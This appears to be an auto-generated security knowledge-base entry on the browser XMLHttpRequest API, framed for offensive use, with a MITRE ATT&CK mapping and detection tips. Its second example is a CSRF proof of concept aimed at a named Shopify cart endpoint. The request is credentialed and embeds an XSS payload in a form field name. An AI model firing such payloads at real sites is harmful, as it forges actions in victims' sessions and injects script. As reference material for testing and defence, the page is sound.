---
url: 'https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest'
tags:
  - javascript
  - http
  - csrf
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.071Z'
id: ab78d95e-e4a3-44bf-bbef-4b7afb58a777
validated: true
submitted: true
---
---

# XMLHttpRequest

**Status**: Unverified

## Overview

XMLHttpRequest is a built-in JavaScript API for making asynchronous HTTP requests from the browser, commonly used in CSRF PoCs to forge cross-site requests with credentials.

## Description

This API enables sending POST requests with custom headers and bodies, including multipart/form-data, ideal for exploiting web vulnerabilities like CSRF in Shopify's cart addition. It supports withCredentials for cookie inclusion, making it suitable for authenticated session hijacking setups.

## Features

- Feature 1: Asynchronous request handling with callbacks
- Feature 2: Support for multipart/form-data boundaries
- Feature 3: Credentialed requests across domains (with CORS)

## Installation

### Requirements

- Modern web browser (Chrome, Firefox, etc.)
- No installation; native JS API

### Install Commands

N/A; available in browser console or scripts.

## Basic Usage

```javascript
// Basic GET example

var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://example.com', true);
xhr.send();
```

### Common Options

| Option | Description |
|--------|-------------|
| open(method, url, async) | Initialize request |
| setRequestHeader(name, value) | Set custom headers |
| withCredentials | Include cookies in cross-origin requests |

## Examples

### Example 1: Basic Usage

```javascript
xhr.open('POST', 'http://target.com/endpoint', true);
xhr.send('data');
```

### Example 2: Advanced Usage for CSRF

```javascript
xhr.open('POST', 'http://hardware.shopify.com/cart/add', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=----boundary');
var body = '------boundary\r\nContent-Disposition: form-data; name="properties[Artwork file\\x3cimg src=\\'test\\' onmouseover=\\'alert(2)\\'\\x3e]"\r\n\r\n\r\n------boundary\r\nContent-Disposition: form-data; name="file"; filename="test.png"\r\nContent-Type: image/png\r\n\r\n[PNG binary data]\r\n------boundary--\r\n';
xhr.send(body);
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Tactics

- [[Execution]]
- [[Initial Access]]

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor network logs for unexpected POSTs from external referers
- Browser dev tools show XHR requests; WAF can block anomalous multipart bodies
- CSP headers to restrict cross-origin requests

## Related Procedures


## Related Tools

- [[Fetch API]]
- [[Burp Suite]]

## References

- Official documentation: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
- Related resources: OWASP CSRF Cheat Sheet
